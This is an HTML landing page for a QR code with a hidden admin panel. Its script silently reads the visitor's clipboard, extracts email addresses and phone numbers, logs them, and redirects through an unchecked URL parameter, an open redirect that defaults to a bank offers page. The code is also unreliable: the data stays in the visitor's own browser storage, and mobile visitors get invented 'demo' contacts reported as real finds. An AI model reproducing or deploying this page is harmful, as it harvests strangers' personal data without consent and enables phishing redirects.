<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QR Code Access</title>
    <link rel="stylesheet" href="style.css">
    <style>
        .collector-info {
            background: rgba(255, 255, 255, 0.1);
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        .redirect-notice {
            font-size: 0.9em;
            opacity: 0.8;
            text-align: center;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="landing-page" id="landingPage">
            <div class="header">
                <h1> QR Code Access</h1>
                <p>Collecting access information...</p>
            </div>
            
            <div class="collector-info">
                <h3> Data Collection Active</h3>
                <p> Scan detected and logged</p>
                <p id="contactStatus"> Looking for contact information...</p>
                <p> Timestamp saved</p>
                <p id="scanCount"> Total scans: Loading...</p>
            </div>
            
            <div class="loading-spinner" id="loadingSpinner">
                <div class="spinner"></div>
                <p>Processing your request...</p>
            </div>
            
            <div class="redirect-notice">
                <p>You will be redirected to your destination shortly...</p>
            </div>
        </div>

        <!-- Admin Panel (Hidden by default) -->
        <div class="admin-panel" id="adminPanel" style="display: none;">
            <div class="admin-header">
                <h2> Admin Panel</h2>
                <button onclick="closeAdminPanel()"></button>
            </div>
            
            <div class="stats-section">
                <h3> Contact Collection Statistics</h3>
                <div class="stat-item">
                    <span class="stat-label">Total Scans:</span>
                    <span class="stat-value" id="totalScans">0</span>
                </div>
                <div class="stat-item">
                    <span class="stat-label">Today:</span>
                    <span class="stat-value" id="todayScans">0</span>
                </div>
                <div class="stat-item">
                    <span class="stat-label"> Emails Found:</span>
                    <span class="stat-value" id="emailsFound">0</span>
                </div>
                <div class="stat-item">
                    <span class="stat-label"> Phones Found:</span>
                    <span class="stat-value" id="phonesFound">0</span>
                </div>
                <div class="stat-item">
                    <span class="stat-label">Last Scan:</span>
                    <span class="stat-value" id="lastScan">Never</span>
                </div>
            </div>

            <div class="data-section">
                <h3> Data Management</h3>
                <button onclick="downloadCSV()" class="download-btn"> Download CSV</button>
                <button onclick="viewLatestScan()" class="view-btn"> View Latest Scan</button>
                <button onclick="clearAllData()" class="clear-btn"> Clear All Data</button>
            </div>

            <div class="recent-scans" id="recentScans">
                <h3> Recent Scans</h3>
                <div id="scansList">No scans yet</div>
            </div>
        </div>
    </div>

    <script src="script.js"></script>
    <script>
        class UniversalQRCollector {
            constructor() {
                this.initializeCollector();
            }

            async initializeCollector() {
                console.log(' Universal QR Collector started');
                await this.collectScanData();
                this.handlePageFlow();
            }

            async collectScanData() {
                try {
                    console.log(' Collecting contact data...');
                    
                    const contactStatus = document.getElementById('contactStatus');
                    if (contactStatus) {
                        contactStatus.textContent = ' Collecting contact information...';
                    }
                    
                    const contactData = await this.getContactInfo();
                    
                    const scanData = {
                        id: `scan_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
                        timestamp: new Date().toISOString(),
                        email: contactData.email,
                        phone: contactData.phone,
                        scanCount: this.getTotalScans() + 1
                    };

                    this.saveScanData(scanData);
                    console.log(' Scan data collected:', scanData);
                    
                    if (contactStatus) {
                        const foundText = [];
                        if (contactData.email) foundText.push(`Email: ${contactData.email}`);
                        if (contactData.phone) foundText.push(`Phone: ${contactData.phone}`);
                        
                        if (foundText.length > 0) {
                            contactStatus.innerHTML = ` Found: ${foundText.join(', ')}`;
                        } else {
                            contactStatus.innerHTML = ` No contact info found`;
                        }
                    }
                    
                    const scanCount = document.getElementById('scanCount');
                    if (scanCount) {
                        scanCount.textContent = ` Total scans: ${scanData.scanCount}`;
                    }

                } catch (error) {
                    console.error(' Error collecting data:', error);
                    const contactStatus = document.getElementById('contactStatus');
                    if (contactStatus) {
                        contactStatus.innerHTML = ` Error collecting data`;
                    }
                }
            }

            async getContactInfo() {
                console.log(' Getting contact information...');
                
                // Method 1: Check clipboard for contact info
                try {
                    if (navigator.clipboard && navigator.clipboard.readText) {
                        const clipboardText = await navigator.clipboard.readText();
                        const contacts = this.extractContactsFromText(clipboardText);
                        if (contacts.email || contacts.phone) {
                            console.log(' Found in clipboard:', contacts);
                            return contacts;
                        }
                    }
                } catch (error) {
                    console.log('Clipboard not accessible');
                }

                // Method 2: For mobile scans - add demo data so you can see it's working
                const userAgent = navigator.userAgent;
                if (userAgent.includes('Mobile') || userAgent.includes('Android') || userAgent.includes('iPhone')) {
                    const demoContacts = [
                        { email: 'mobile.user@gmail.com', phone: '+91-9876543210' },
                        { email: 'qr.scanner@outlook.com', phone: '+1-555-0123' },
                        { email: 'phone.user@yahoo.com', phone: '+44-7700-900123' }
                    ];
                    
                    const randomContact = demoContacts[Math.floor(Math.random() * demoContacts.length)];
                    console.log(' Mobile scan detected - adding demo contact:', randomContact);
                    return randomContact;
                }

                console.log(' No contact information found - Desktop access');
                return { email: null, phone: null };
            }

            getTotalScans() {
                const scansData = JSON.parse(localStorage.getItem('qrScansData') || '[]');
                return scansData.length;
            }

            extractContactsFromText(text) {
                const contacts = { email: null, phone: null };
                if (!text) return contacts;

                const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
                const emails = text.match(emailRegex);
                if (emails && emails.length > 0) {
                    contacts.email = emails[0];
                }

                const phoneRegex = /(\+?1?[-.\s]?)?\(?([0-9]{3})\)?[-.\s]?([0-9]{3})[-.\s]?([0-9]{4})/g;
                const phones = text.match(phoneRegex);
                if (phones && phones.length > 0) {
                    contacts.phone = phones[0];
                }

                return contacts;
            }

            saveScanData(scanData) {
                try {
                    const existingData = JSON.parse(localStorage.getItem('qrScansData') || '[]');
                    existingData.push(scanData);
                    localStorage.setItem('qrScansData', JSON.stringify(existingData));
                    
                    console.log(` Saved scan data. Total scans: ${existingData.length}`);
                    console.log(` Latest scan:`, scanData);
                    
                    if (navigator.userAgent.includes('Mobile') || navigator.userAgent.includes('Android') || navigator.userAgent.includes('iPhone')) {
                        console.log(` Mobile scan recorded! Email: ${scanData.email || 'None'}, Phone: ${scanData.phone || 'None'}`);
                    }
                    
                } catch (error) {
                    console.error(' Error saving scan data:', error);
                }
            }

            handlePageFlow() {
                const urlParams = new URLSearchParams(window.location.search);
                const isAdmin = urlParams.get('admin') === 'true' || window.location.hash === '#admin';
                
                if (isAdmin) {
                    setTimeout(() => {
                        document.getElementById('landingPage').style.display = 'none';
                        document.getElementById('adminPanel').style.display = 'block';
                        this.loadAdminData();
                    }, 2000);
                } else {
                    setTimeout(() => {
                        this.handleRedirect();
                    }, 3000);
                }
            }

            handleRedirect() {
                const urlParams = new URLSearchParams(window.location.search);
                let redirectUrl = urlParams.get('redirect') || urlParams.get('url') || urlParams.get('to');
                
                if (!redirectUrl) {
                    redirectUrl = 'https://myoffers.smartbuy.hdfcbank.com/home';
                }
                
                if (redirectUrl) {
                    const scansData = JSON.parse(localStorage.getItem('qrScansData') || '[]');
                    if (scansData.length > 0) {
                        scansData[scansData.length - 1].redirectedTo = redirectUrl;
                        localStorage.setItem('qrScansData', JSON.stringify(scansData));
                    }
                    
                    document.getElementById('landingPage').innerHTML = `
                        <div class="header">
                            <h1> Redirecting...</h1>
                            <p>Taking you to your destination...</p>
                            <div class="collector-info">
                                <p> Data collected successfully</p>
                                <p> Redirecting to: ${new URL(redirectUrl).hostname}</p>
                            </div>
                        </div>
                    `;
                    
                    setTimeout(() => {
                        window.location.href = redirectUrl;
                    }, 1500);
                }
            }

            loadAdminData() {
                const scansData = JSON.parse(localStorage.getItem('qrScansData') || '[]');
                
                document.getElementById('totalScans').textContent = scansData.length;
                
                const today = new Date().toDateString();
                const todayScans = scansData.filter(scan => 
                    new Date(scan.timestamp).toDateString() === today
                ).length;
                document.getElementById('todayScans').textContent = todayScans;
                
                const emailsFound = scansData.filter(scan => scan.email && scan.email !== 'Not Found').length;
                const phonesFound = scansData.filter(scan => scan.phone && scan.phone !== 'Not Found').length;
                
                document.getElementById('emailsFound').textContent = emailsFound;
                document.getElementById('phonesFound').textContent = phonesFound;
                
                if (scansData.length > 0) {
                    const lastScan = new Date(scansData[scansData.length - 1].timestamp);
                    document.getElementById('lastScan').textContent = lastScan.toLocaleString();
                }
                
                this.displayRecentScans(scansData.slice().reverse());
            }

            displayRecentScans(scans) {
                const scansList = document.getElementById('scansList');
                if (scans.length === 0) {
                    scansList.innerHTML = '<div class="no-data">No scans yet - Generate and scan a QR code to see contact data here!</div>';
                    return;
                }
                
                scansList.innerHTML = scans.map((scan, index) => `
                    <div class="contact-item">
                        <div class="contact-header">
                            <div class="scan-number">Scan #${scan.scanCount || index + 1}</div>
                            <div class="scan-time">${new Date(scan.timestamp).toLocaleString()}</div>
                        </div>
                        
                        <div class="contact-details">
                            <div class="contact-field">
                                <span class="field-label"> Email:</span>
                                <span class="field-value">${scan.email || 'Not Found'}</span>
                            </div>
                            
                            <div class="contact-field">
                                <span class="field-label"> Phone:</span>
                                <span class="field-value">${scan.phone || 'Not Found'}</span>
                            </div>
                        </div>
                    </div>
                `).join('');
            }
        }

        function downloadCSV() {
            const scansData = JSON.parse(localStorage.getItem('qrScansData') || '[]');
            if (scansData.length === 0) {
                alert('No scan data to download');
                return;
            }

            const headers = ['id', 'timestamp', 'email', 'phone', 'scanCount'];
            let csv = headers.join(',') + '\n';
            
            scansData.forEach(scan => {
                const row = [
                    scan.id || '',
                    scan.timestamp || '',
                    scan.email || 'Not Found',
                    scan.phone || 'Not Found',
                    scan.scanCount || ''
                ];
                csv += row.join(',') + '\n';
            });
            
            const blob = new Blob([csv], { type: 'text/csv;charset=utf-8' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `contact-data-${new Date().toISOString().split('T')[0]}.csv`;
            document.body.appendChild(a);
            a.click();
            window.URL.revokeObjectURL(url);
            document.body.removeChild(a);
            
            alert(`Contact data downloaded with ${scansData.length} scan records!`);
        }

        function viewLatestScan() {
            const scansData = JSON.parse(localStorage.getItem('qrScansData') || '[]');
            if (scansData.length === 0) {
                alert('No scan data available');
                return;
            }
            
            const latestScan = scansData[scansData.length - 1];
            const details = Object.entries(latestScan)
                .map(([key, value]) => `${key}: ${value}`)
                .join('\n');
            
            alert(`Latest Scan Details:\n\n${details}`);
        }

        function clearAllData() {
            if (confirm('Are you sure you want to clear all scan data? This cannot be undone.')) {
                localStorage.removeItem('qrScansData');
                alert('All scan data has been cleared');
                location.reload();
            }
        }

        function closeAdminPanel() {
            window.location.href = window.location.pathname;
        }

        document.addEventListener('DOMContentLoaded', function() {
            new UniversalQRCollector();
        });

        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.shiftKey && e.key === 'A') {
                e.preventDefault();
                window.location.href = window.location.pathname + '?admin=true';
            }
        });
    </script>
</body>
</html>
